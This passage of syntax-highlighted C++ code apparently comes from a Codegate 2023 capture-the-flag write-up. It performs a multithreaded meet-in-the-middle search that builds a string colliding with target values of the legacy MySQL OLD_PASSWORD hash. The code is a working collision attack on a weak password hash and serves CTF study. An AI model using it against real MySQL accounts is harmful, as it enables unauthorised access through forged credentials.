i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (cc[i] == &lt;span class=&#34;string&#34;&gt;&amp;#x27; &amp;#x27;&lt;/span&gt; || cc[i] == &lt;span class=&#34;string&#34;&gt;&amp;#x27;\t&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        tmp = cc[i];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        *nr ^= (((*nr &amp;amp; &lt;span class=&#34;number&#34;&gt;63&lt;/span&gt;) + *add) * tmp) + (*nr &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        *nr2 += (*nr2 &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt; ) ^ *nr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        *add += tmp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; mask = (((&lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt;)&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;31&lt;/span&gt;) - (&lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt;)&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;// 111....11, 31bits&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    *nr &amp;amp;= mask;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    *nr2 &amp;amp;= mask;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// printf(&amp;quot;hash: %x %x\n&amp;quot;, *nr, *nr2);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;calc&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *cc, &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; len, &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; *nr, &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; *nr2)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	*nr = &lt;span class=&#34;number&#34;&gt;1345345333&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	*nr2 = &lt;span class=&#34;number&#34;&gt;0x12345671&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; add = &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    forward(cc, len, nr, nr2, &amp;amp;add);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Ans&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; buf[&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;pair_hash&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;template&lt;/span&gt; &amp;lt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;T1&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;T2&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;std::&lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;operator&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; std::pair&amp;lt;T1, T2&amp;gt; &amp;amp;pair)&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; std::&lt;span class=&#34;built_in&#34;&gt;hash&lt;/span&gt;&amp;lt;T1&amp;gt;()(pair.first) ^ std::&lt;span class=&#34;built_in&#34;&gt;hash&lt;/span&gt;&amp;lt;T2&amp;gt;()(pair.second);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;bool&lt;/span&gt; ok_maps[&lt;span class=&#34;number&#34;&gt;65536&lt;/span&gt;] = &amp;#123;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&amp;#125;; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; nr, nr2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; cp[] = &lt;span class=&#34;string&#34;&gt;&amp;quot;codegate2023&amp;#123;Mysql_olD_P455woRD_I5_CoMP_bEEE_KE03&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    nr = &lt;span class=&#34;number&#34;&gt;1345345333&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	nr2 = &lt;span class=&#34;number&#34;&gt;0x12345671&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; add = &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    forward(cp, &lt;span class=&#34;built_in&#34;&gt;strlen&lt;/span&gt;((&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)cp), &amp;amp;nr, &amp;amp;nr2, &amp;amp;add);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;nr: %x, nr2: %x, add: %x\n&amp;quot;&lt;/span&gt;, nr, nr2, add);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; fnr = nr, fnr2 = nr2, fadd = add;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; uadd = &lt;span class=&#34;number&#34;&gt;127&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;, fuadd = fadd;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    fadd += uadd;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; cs[] = &lt;span class=&#34;string&#34;&gt;&amp;quot;i_love_you&amp;#125;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    std::vector&amp;lt;std::thread&amp;gt; ths;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    std::mutex mtx;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    std::unordered_map&amp;lt;std::pair&amp;lt;&lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt;, &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt;&amp;gt;, Ans, pair_hash&amp;gt; maps;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    std::atomic&amp;lt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;&amp;gt; cnter&amp;#123;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i = &lt;span class=&#34;number&#34;&gt;500&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;number&#34;&gt;20000&lt;/span&gt;; i++) &amp;#123; &lt;span class=&#34;comment&#34;&gt;// find possible `add` value &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; pnr = &lt;span class=&#34;number&#34;&gt;0x63686163&lt;/span&gt;, pnr2 = &lt;span class=&#34;number&#34;&gt;0x68613230&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; ans = &lt;span class=&#34;built_in&#34;&gt;oldpw_rev&lt;/span&gt;(&amp;amp;pnr, &amp;amp;pnr2, i, cs, &lt;span class=&#34;number&#34;&gt;11&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (ans != &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ok_maps[i] = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; i = &lt;span class=&#34;number&#34;&gt;33&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;number&#34;&gt;127&lt;/span&gt;; i++) &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ths.&lt;span class=&#34;built_in&#34;&gt;emplace_back&lt;/span&gt;([&amp;amp;, i] &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            std::vector&amp;lt;std::pair&amp;lt;std::pair&amp;lt;&lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt;, &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt;&amp;gt;, Ans&amp;gt;&amp;gt; all;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            Ans cc;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            cc.buf[&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;] = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            cc.buf[&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;] = i;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; c = &lt;span class=&#34;number&#34;&gt;33&lt;/span&gt;; c &amp;lt; &lt;span class=&#34;number&#34;&gt;127&lt;/span&gt;; c++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                cc.buf[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;] = c;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; d = &lt;span class=&#34;number&#34;&gt;33&lt;/span&gt;; d &amp;lt; &lt;span class=&#34;number&#34;&gt;127&lt;/span&gt;; d++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    cc.buf[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;] = d;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; a = &lt;span class=&#34;number&#34;&gt;33&lt;/span&gt;; a &amp;lt; &lt;span class=&#34;number&#34;&gt;127&lt;/span&gt;; a++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; sumer = fadd + i + c + d + a + &lt;span class=&#34;number&#34;&gt;1207&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        cc.buf[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;] = a;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; b = &lt;span class=&#34;number&#34;&gt;33&lt;/span&gt;; b &amp;lt; &lt;span class=&#34;number&#34;&gt;127&lt;/span&gt;; b++) &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (ok_maps[sumer + b]) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                            cc.buf[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] = b;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                            &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; pnr = &lt;span class=&#34;number&#34;&gt;0x63686163&lt;/span&gt;, pnr2 = &lt;span class=&#34;number&#34;&gt;0x68613230&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                            &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; ans = &lt;span class=&#34;built_in&#34;&gt;oldpw_rev&lt;/span&gt;(&amp;amp;pnr, &amp;amp;pnr2, fadd + i + c + d + a + b + &lt;span class=&#34;number&#34;&gt;1207&lt;/span&gt;, cs, &lt;span class=&#34;number&#34;&gt;11&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;// backward: suffix&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (ans != &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                            ans = &lt;span class=&#34;built_in&#34;&gt;oldpw_rev&lt;/span&gt;(&amp;amp;pnr, &amp;amp;pnr2, fadd + i + c + d + a + b, cc.buf, &lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;// ... and extra 5 steps&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (ans != &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                            ++cnter; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                            all.&lt;span class=&#34;built_in&#34;&gt;emplace_back&lt;/span&gt;(std::&lt;span class=&#34;built_in&#34;&gt;make_pair&lt;/span&gt;(std::&lt;span class=&#34;built_in&#34;&gt;make_pair&lt;/span&gt;(pnr, pnr2), cc)); &lt;span class=&#34;comment&#34;&gt;// possible nr/nr2 pair, record it&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            std::lock_guard&amp;lt;std::mutex&amp;gt; &lt;span class=&#34;built_in&#34;&gt;lock&lt;/span&gt;(mtx);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;auto&lt;/span&gt; &amp;amp;&amp;amp;p:all) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                maps[p.first] = p.second;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;auto&lt;/span&gt; &amp;amp;&amp;amp;th:ths) th.&lt;span class=&#34;built_in&#34;&gt;join&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ths.&lt;span class=&#34;built_in&#34;&gt;clear&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;MITM&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d\n&amp;quot;&lt;/span&gt;, cnter.&lt;span class=&#34;built_in&#34;&gt;load&lt;/span&gt;());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; i = &lt;span class=&#34;number&#34;&gt;33&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;number&#34;&gt;127&lt;/span&gt;; i++) &amp;#123; &lt;span class=&#34;comment&#34;&gt;// forward&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ths.&lt;span class=&#34;built_in&#34;&gt;emplace_back&lt;/span&gt;([&amp;amp;, i] &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; buf[&lt;span class=&#34;number&#34;&gt;50&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            buf[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] = i;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; c = &lt;span class=&#34;number&#34;&gt;33&lt;/span&gt;; c &amp;lt; &lt;span class=&#34;number&#34;&gt;127&lt;/span&gt;; c++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                buf[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;] = c;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; d = &lt;span class=&#34;number&#34;&gt;33&lt;/span&gt;; d &amp;lt; &lt;span class=&#34;number&#34;&gt;127&lt;/span&gt;; d++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    buf[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;] = d;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; a = &lt;span class=&#34;number&#34;&gt;33&lt;/span&gt;; a &amp;lt; &lt;span class=&#34;number&#34;&gt;127&lt;/span&gt;; a++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        buf[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;] = a;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; b = &lt;span class=&#34;number&#34;&gt;33&lt;/span&gt;; b &amp;lt; &lt;span class=&#34;number&#34;&gt;127&lt;/span&gt;; b++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                            buf[&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;] = b;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                            &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; e = &lt;span class=&#34;number&#34;&gt;33&lt;/span&gt;; e &amp;lt; &lt;span class=&#34;number&#34;&gt;127&lt;/span&gt;; e++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                buf[&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;] = e;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; re = uadd - i - c - d - a - b - e;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; iter = &lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; (re &amp;gt;= &lt;span class=&#34;number&#34;&gt;33&lt;/span&gt;) &amp;#123; &lt;span class=&#34;comment&#34;&gt;// padding, to make the `add` value is `fadd`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                    &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; tw = re;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (re &amp;gt; &lt;span class=&#34;number&#34;&gt;126&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                        tw = &lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                    buf[iter++] = tw;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                    re -= tw;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (re != &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                buf[iter] = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; nr = fnr, nr2 = fnr2, add = fuadd;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                forward(buf, iter, &amp;amp;nr, &amp;amp;nr2, &amp;amp;add);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                &lt;span class=&#34;keyword&#34;&gt;auto&lt;/span&gt; cc2 = std::&lt;span class=&#34;built_in&#34;&gt;make_pair&lt;/span&gt;(nr, nr2);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (maps.&lt;span class=&#34;built_in&#34;&gt;find&lt;/span&gt;(cc2) != maps.&lt;span class=&#34;built_in&#34;&gt;end&lt;/span&gt;()) &amp;#123; &lt;span class=&#34;comment&#34;&gt;// GOT!!!&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%s%s%s%s\n&amp;quot;&lt;/span&gt;, cp, buf, maps[cc2].buf, cs);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                    &lt;span class=&#34;comment&#34;&gt;// exit(0);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;auto&lt;/span&gt; 